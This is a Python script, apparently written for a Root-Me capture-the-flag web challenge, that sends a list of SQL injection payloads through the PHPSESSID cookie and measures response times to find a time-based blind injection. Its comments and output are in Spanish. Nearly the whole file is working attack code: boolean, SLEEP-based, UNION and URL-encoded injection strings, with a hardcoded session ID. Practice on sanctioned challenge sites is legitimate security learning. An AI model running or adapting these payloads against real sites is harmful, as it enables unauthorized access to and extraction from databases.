import requests
import time

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
SESSION_ID = "fbf0fdc633505f66eef3f20808f0d1ce"

def test_cookie_injection(cookie_value):
    """Prueba inyección en la cookie"""
    cookies = {"PHPSESSID": cookie_value}
    
    inicio = time.time()
    try:
        r = requests.get(URL, cookies=cookies, timeout=30)
        tiempo = time.time() - inicio
        return tiempo, len(r.text)
    except:
        return 0, 0

print("="*70)
print("  PROBANDO INYECCIÓN EN COOKIE")
print("="*70)

# Baseline
t, l = test_cookie_injection(SESSION_ID)
print(f"Baseline: {t:.2f}s, Length: {l}")

# Probar diferentes inyecciones en la cookie
payloads = [
    f"{SESSION_ID}' OR '1'='1",
    f"{SESSION_ID}' OR 1=1-- -",
    f"{SESSION_ID}' OR SLEEP(5)-- -",
    f"{SESSION_ID}' OR IF(1=1, SLEEP(5), 0)-- -",
    f"{SESSION_ID}' AND SLEEP(5)-- -",
    f"{SESSION_ID}' UNION SELECT 1,2,3-- -",
    f"{SESSION_ID}%27%20OR%20SLEEP%285%29--%20-",
    f"{SESSION_ID}%27%20AND%20SLEEP%285%29--%20-",
]

for payload in payloads:
    t, l = test_cookie_injection(payload)
    status = "✅" if t > 2 else "❌"
    print(f"{status} {payload[:50]:50} -> {t:.2f}s, Length: {l}")
    time.sleep(0.3)
